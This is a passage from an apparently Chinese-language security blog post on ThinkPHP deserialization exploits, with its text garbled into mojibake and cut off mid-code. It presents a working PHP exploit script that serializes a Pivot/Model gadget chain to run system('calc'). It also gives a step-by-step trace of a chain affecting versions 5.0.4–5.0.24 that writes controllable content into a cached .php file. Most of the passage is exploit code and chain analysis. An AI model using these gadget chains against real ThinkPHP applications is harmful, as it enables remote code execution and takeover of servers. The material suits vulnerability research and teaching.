class="variable">$key</span>] = <span class="variable">$closure</span>(<span class="variable">$value</span>[<span class="variable">$key</span>], <span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// éœ€è¦è®¾ç½®ï¼š</span></span><br><span class="line">            <span class="comment">// $this-&gt;data[&quot;key&quot;] = stdClass();</span></span><br><span class="line">            <span class="comment">// $this-&gt;data[&quot;key&quot;]-&gt;key = &quot;calc&quot;;</span></span><br><span class="line">            <span class="variable">$value</span>-&gt;<span class="variable">$key</span> = <span class="variable">$closure</span>(<span class="variable">$value</span>-&gt;<span class="variable">$key</span>, <span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="åˆ©ç”¨è„šæœ¬-3"><a href="#åˆ©ç”¨è„šæœ¬-3" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h3><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span> &#123;</span><br><span class="line">    <span class="title class_">trait</span> <span class="title class_">Attribute</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">data</span>, $<span class="title class_">withAttr</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$json</span>, <span class="variable">$jsonAssoc</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">trait</span> <span class="title">ModelEvent</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$withEvent</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">use</span> \<span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>\<span class="title class_">Attribute</span>;</span><br><span class="line">        <span class="keyword">use</span> \<span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$exists</span>, <span class="variable">$force</span>, <span class="variable">$lazySave</span>, <span class="variable">$data</span>, <span class="variable">$withAttr</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$suffix</span>, <span class="variable">$json</span>, <span class="variable">$jsonAssoc</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$depth</span>, <span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$depth</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;jsonAssoc);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;withAttr);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;json);</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;data = [<span class="number">0</span>];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;suffix = <span class="keyword">new</span> \think\model\<span class="title function_ invoke__">Pivot</span>(<span class="number">1</span>, <span class="variable">$func</span>, <span class="variable">$param</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;lazySave);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;suffix);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;force);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;exists);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;exists);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;withEvent);</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;jsonAssoc = <span class="literal">true</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&quot;key&quot;</span> =&gt; [<span class="string">&quot;key&quot;</span> =&gt; <span class="variable">$func</span>]];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;key&quot;</span> =&gt; [<span class="string">&quot;key&quot;</span> =&gt; <span class="variable">$param</span>]];</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;json = [<span class="string">&quot;key&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> \<span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">payload</span> = <span class="title class_">new</span> \<span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>(0, &quot;<span class="title class_">system</span>&quot;, &quot;<span class="title class_">calc</span>&quot;);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="FW1ï¼ˆå½±å“-5-0-4-5-0-24ï¼‰"><a href="#FW1ï¼ˆå½±å“-5-0-4-5-0-24ï¼‰" class="headerlink" title="FW1ï¼ˆå½±å“ 5.0.4 - 5.0.24ï¼‰"></a>FW1ï¼ˆå½±å“ 5.0.4 - 5.0.24ï¼‰</h2><h3 id="åŸºæœ¬ä¿¡æ¯-4"><a href="#åŸºæœ¬ä¿¡æ¯-4" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><ul>
<li><p><strong>å½±å“èŒƒå›´</strong> ï¼š5.0.4 - 5.0.24</p>
</li>
<li><p><strong>ç”Ÿæˆå‘½ä»¤</strong> ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>ååºåˆ—åŒ–å¯¹è±¡</strong> ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/07/28/ThinkPHP%20%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/images/TPFW1.svg"
                      alt="TPFW1"
                ></p>
</li>
<li><p><strong>ååºåˆ—åŒ–è°ƒç”¨é“¾</strong> ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">think\Process-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">â””â”€â”€ <span class="title function_ invoke__">stop</span>(): <span class="keyword">int</span></span><br><span class="line">    â”œâ”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isRunning</span>())                            <span class="comment">// âŒ $this-&gt;status = STATUS_READYï¼Œè¿”å› falseï¼Œä¸è¿›å…¥</span></span><br><span class="line">    â”‚   â””â”€â”€ <span class="title function_ invoke__">isRunning</span>(): <span class="keyword">bool</span></span><br><span class="line">    â”‚       â”œâ”€â”€ <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">STATUS_STARTED</span> !== <span class="variable language_">$this</span>-&gt;status) <span class="comment">// âœ… é»˜è®¤ status = &quot;ready&quot;</span></span><br><span class="line">    â”‚       â”‚   â””â”€â”€ <span class="keyword">return</span> <span class="literal">false</span> <span class="comment">// âœ… ç›´æ¥è¿”å›</span></span><br><span class="line">    â”‚       â””â”€â”€ <span class="comment">// âŒ ä¸è¿›å…¥åç»­åˆ¤æ–­</span></span><br><span class="line">    â”œâ”€â”€ <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateStatus</span>(<span class="literal">false</span>)</span><br><span class="line">    â”‚   â””â”€â”€ <span class="title function_ invoke__">updateStatus</span>(<span class="keyword">bool</span> <span class="variable">$blocking</span>): <span class="keyword">void</span></span><br><span class="line">    â”‚       â”œâ”€â”€ <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">STATUS_STARTED</span> !== <span class="variable language_">$this</span>-&gt;status) <span class="comment">// âœ… status = &quot;ready&quot;</span></span><br><span class="line">    â”‚       â”‚   â””â”€â”€ <span class="keyword">return</span>; <span class="comment">// âœ… ç›´æ¥è¿”å›</span></span><br><span class="line">    â”‚       â””â”€â”€ <span class="comment">// âŒ ä¸æ‰§è¡Œåç»­é€»è¾‘</span></span><br><span class="line">    â””â”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;processInformation[<span class="string">&#x27;running&#x27;</span>])          <span class="comment">// âœ… = trueï¼Œè¿›å…¥åˆ†æ”¯</span></span><br><span class="line">        â””â”€â”€ <span class="title function_ invoke__">close</span>(): <span class="keyword">int</span></span><br><span class="line">            â””â”€â”€ <span class="variable language_">$this</span>-&gt;processPipes-&gt;<span class="title function_ invoke__">close</span>()</span><br><span class="line">                <span class="comment">// $processPipes = HasMany å¯¹è±¡ï¼Œæ²¡æœ‰ close æ–¹æ³•ï¼Œè§¦å‘ __call é­”æœ¯æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">think\model\relation<span class="title class_">\HasMany</span>::<span class="title function_ invoke__">__call</span>(<span class="keyword">string</span> <span class="variable">$method</span> = <span class="string">&quot;close&quot;</span>, <span class="keyword">array</span> <span class="variable">$args</span> = [])</span><br><span class="line">â””â”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;query)                                      <span class="comment">// âœ… query ä¸ä¸ºç©ºï¼Œè¿›å…¥</span></span><br><span class="line">    â””â”€â”€ <span class="title function_ invoke__">baseQuery</span>(): <span class="keyword">void</span></span><br><span class="line">        â””â”€â”€ <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;baseQuery))                   <span class="comment">// âœ… baseQuery = nullï¼Œè¿›å…¥</span></span><br><span class="line">            â””â”€â”€ <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;localKey&#125;)) <span class="comment">// âœ… å‡è®¾ parent.k å­˜åœ¨</span></span><br><span class="line">                â””â”€â”€ <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$this</span>-&gt;foreignKey, <span class="variable">$this</span>-&gt;<span class="built_in">parent</span>-&gt;&#123;<span class="variable">$this</span>-&gt;localKey&#125;) <span class="comment">// âœ… $this-&gt;localKey = &#x27;k&#x27;, $this-&gt;parent-&gt;k éšä¾¿ä¸€ä¸ªå€¼ï¼Œæ¯”å¦‚ 0</span></span><br><span class="line">                    <span class="comment">// $query æ˜¯ Output å¯¹è±¡ï¼Œè§¦å‘å…¶ __call é­”æœ¯æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line">think\console<span class="title class_">\Output</span>::<span class="title function_ invoke__">__call</span>(<span class="keyword">string</span> <span class="variable">$method</span> = <span class="string">&quot;where&quot;</span>, <span class="keyword">array</span> <span class="variable">$args</span> = [<span class="string">&quot;file_content&quot;</span>, <span class="number">0</span>])</span><br><span class="line">â””â”€â”€ <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;styles))                  <span class="comment">// âœ… styles = [&#x27;where&#x27;]ï¼Œè¿›å…¥åˆ¤æ–­</span></span><br><span class="line">    â”œâ”€â”€ <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$method</span>)                      <span class="comment">// âœ… $args = [&#x27;where&#x27;, &#x27;file_content&#x27;, 0]</span></span><br><span class="line">    â””â”€â”€ <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;block&#x27;</span>], <span class="variable">$args</span> = [<span class="string">&#x27;where&#x27;</span>, <span class="string">&#x27;file_content&#x27;</span>, <span class="number">0</span>])</span><br><span class="line">        â””â”€â”€ <span class="title function_ invoke__">block</span>(style = <span class="string">&quot;where&quot;</span>, message = <span class="string">&quot;file_content&quot;</span>)</span><br><span class="line">            â””â”€â”€ <span class="title function_ invoke__">writeln</span>(messages = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, type = <span class="number">0</span>)</span><br><span class="line">                â””â”€â”€ <span class="title function_ invoke__">write</span>(messages = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, newline = <span class="literal">true</span>, type = <span class="number">0</span>)</span><br><span class="line">                    â””â”€â”€ <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">write</span>(</span><br><span class="line">                            messages = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, </span><br><span class="line">                            newline = <span class="literal">true</span>, </span><br><span class="line">                            type = <span class="number">0</span></span><br><span class="line">                        )</span><br><span class="line">                        <span class="comment">// handle = Memcache å¯¹è±¡ï¼Œè¿›å…¥ write</span></span><br><span class="line"></span><br><span class="line">think\session\driver<span class="title class_">\Memcache</span>::<span class="title function_ invoke__">write</span>(<span class="keyword">string</span> <span class="variable">$sessID</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, <span class="keyword">string</span> <span class="variable">$sessData</span> = <span class="literal">true</span>)</span><br><span class="line">â””â”€â”€ <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(</span><br><span class="line">        <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;session_name&#x27;</span>] . <span class="variable">$sessID</span>,           // âœ… session_name = <span class="string">&#x27;&#x27;</span> â†’ <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span></span><br><span class="line">        <span class="variable">$sessData</span>,                                         // âœ… = <span class="literal">true</span></span><br><span class="line">        <span class="number">0</span>,                                                 // ç¬¬ä¸‰ä¸ªå‚æ•° = <span class="number">0</span></span><br><span class="line">        <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;expire&#x27;</span>]                            // âœ… é»˜è®¤ä¸º <span class="number">3600</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment">// handler = Memcached å¯¹è±¡ â†’ set()</span></span><br><span class="line"></span><br><span class="line">think\cache\driver<span class="title class_">\Memcached</span>::<span class="title function_ invoke__">set</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, <span class="keyword">mixed</span> <span class="variable">$value</span> = <span class="literal">true</span>, <span class="keyword">int</span> <span class="variable">$expire</span> = <span class="number">0</span>)</span><br><span class="line">â””â”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$name</span>)) == <span class="literal">true</span>          <span class="comment">// âœ… $tag = true ä¸”ç¼“å­˜ä¸å­˜åœ¨</span></span><br><span class="line">    â””â”€â”€ <span class="title function_ invoke__">has</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>): <span class="keyword">bool</span></span><br><span class="line">        â”œâ”€â”€ <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>)</span><br><span class="line">        â”‚   â””â”€â”€ <span class="title function_ invoke__">getCacheKey</span>(<span class="keyword">string</span> <span class="variable">$name</span>): <span class="keyword">string</span></span><br><span class="line">        â”‚       â””â”€â”€ <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span> <span class="comment">// âœ… prefix = &#x27;&#x27;</span></span><br><span class="line">        â”œâ”€â”€ <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>)</span><br><span class="line">        â”‚   â””â”€â”€ think\cache\driver<span class="title class_">\File</span>::<span class="title function_ invoke__">get</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, <span class="keyword">mixed</span> <span class="variable">$default</span> = <span class="literal">false</span>)</span><br><span class="line">        â”‚       â”œâ”€â”€ <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>, <span class="literal">true</span>)</span><br><span class="line">        â”‚       â”‚   â””â”€â”€ <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>) . <span class="string">&quot;.php&quot;</span></span><br><span class="line">        â”‚       â”œâ”€â”€ <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) == <span class="literal">true</span>         <span class="comment">// âœ… æ–‡ä»¶ä¸å­˜åœ¨</span></span><br><span class="line">        â”‚       â””â”€â”€ <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        â””â”€â”€ <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    â””â”€â”€ <span class="variable">$first</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">â””â”€â”€ <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>) = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span></span><br><span class="line">â””â”€â”€ <span class="variable">$expire</span> = (<span class="number">0</span> == <span class="variable">$expire</span>) ? <span class="number">0</span> : <span class="title function_ invoke__">time</span>() + <span class="variable">$expire</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ğŸ“Œ ç¬¬ä¸€æ¬¡å†™å…¥ï¼ˆå†…å®¹ä¸å¯æ§ï¼‰</span></span><br><span class="line">â””â”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$key</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, <span class="variable">$value</span> = <span class="literal">true</span>, <span class="variable">$expire</span> = <span class="number">0</span>)) == <span class="literal">true</span></span><br><span class="line">    â””â”€â”€ think\cache\driver<span class="title class_">\File</span>::<span class="title function_ invoke__">set</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>, <span class="keyword">mixed</span> <span class="variable">$value</span> = <span class="literal">true</span>, <span class="keyword">int</span> <span class="variable">$expire</span> = <span class="number">0</span>)</span><br><span class="line">    â”‚   â”œâ”€â”€ <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) == <span class="literal">false</span></span><br><span class="line">    â”‚   â”œâ”€â”€ <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) == <span class="literal">false</span></span><br><span class="line">    â”‚   â”œâ”€â”€ <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>, <span class="literal">true</span>)</span><br><span class="line">    â”‚   â”‚   â””â”€â”€ <span class="title function_ invoke__">getCacheKey</span>(<span class="keyword">string</span> <span class="variable">$name</span>, <span class="keyword">bool</span> <span class="variable">$auto</span> = <span class="literal">true</span>): <span class="keyword">string</span></span><br><span class="line">    â”‚   â”‚       â”œâ”€â”€ <span class="variable">$name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$name</span>)</span><br><span class="line">    â”‚   â”‚       â”œâ”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;cache_subdir&#x27;</span>]) == <span class="literal">false</span></span><br><span class="line">    â”‚   â”‚       â”œâ”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>]) == <span class="literal">false</span></span><br><span class="line">    â”‚   â”‚       â”œâ”€â”€ <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;path&#x27;</span>] . <span class="variable">$name</span> . <span class="string">&quot;.php&quot;</span></span><br><span class="line">    â”‚   â”‚       â””â”€â”€ <span class="keyword">if</span> (<span class="variable">$auto</span> &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="title function_ invoke__">dirname</span>(<span class="variable">$filename</span>))) â†’ <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>)</span><br><span class="line">    â”‚   â”œâ”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) == <span class="literal">false</span> <span class="comment">// âœ… $this-&gt;tag = falseï¼Œè·³è¿‡ï¼Œ$first æœªè®¾ç½®</span></span><br><span class="line">    â”‚   â”œâ”€â”€ <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="literal">true</span>) = <span class="string">&#x27;b:1;&#x27;</span></span><br><span class="line">    â”‚   â”œâ”€â”€ <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>]) == <span class="literal">false</span>   <span class="comment">// âœ… æœªå¯ç”¨å‹ç¼©</span></span><br><span class="line">    â”‚   â”œâ”€â”€ <span class="variable">$data</span> = <span class="string">&quot;&lt;?php\n//000000000000\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span></span><br><span class="line">    â”‚   â”œâ”€â”€ <span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>)   <span class="comment">// âœ… ç¬¬ä¸€æ¬¡å†™å…¥ï¼ˆå†…å®¹ä¸å¯æ§ï¼‰</span></span><br><span class="line">    â”‚   â””â”€â”€ <span class="keyword">if</span> (<span class="variable">$result</span>) == <span class="literal">true</span></span><br><span class="line">    â”‚       â”œâ”€â”€ <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$first</span>))                          <span class="comment">// âŒ $first æœªè®¾ç½®</span></span><br><span class="line">    â”‚       â”‚   â””â”€â”€ <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$filename</span>)            <span class="comment">// âŒ å†™å…¥å€¼ä¸ºè·¯å¾„ï¼Œä¸å¯æ§ï¼Œä¸æ˜¯åˆ©ç”¨ç‚¹</span></span><br><span class="line">    â”‚       â””â”€â”€ <span class="title function_ invoke__">clearstatcache</span>()</span><br><span class="line">    â”‚       â””â”€â”€ <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    â”‚</span><br><span class="line">    <span class="comment">// ğŸ“Œ ç¬¬äºŒæ¬¡å†™å…¥ï¼ˆå†…å®¹å¯æ§ï¼‰æ¥è‡ªä¸Šå±‚ Memcached::set â†’ setTagItem($key)</span></span><br><span class="line">    â””â”€â”€ <span class="keyword">if</span> (<span class="variable">$first</span>) == <span class="literal">true</span></span><br><span class="line">        â””â”€â”€ <span class="title function_ invoke__">setTagItem</span>(<span class="keyword">string</span> <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span>)</span><br><span class="line">            â”œâ”€â”€ <span class="variable">$key</span> = <span class="string">&quot;tag_&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;tag)</span><br><span class="line">            â”œâ”€â”€ <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$key</span>)) == <span class="literal">true</span></span><br><span class="line">            â”‚   â””â”€â”€ <span class="variable">$value</span> = <span class="variable">$name</span> = <span class="string">&quot;&lt;where&gt;file_content&lt;/where&gt;&quot;</span> <span class="comment">// âœ… å¯æ§å†…å®¹</span></span><br><span class="line">            â””â”€â”€ <span class="variable language_">$this</span>-&gt;<span class="title function_ 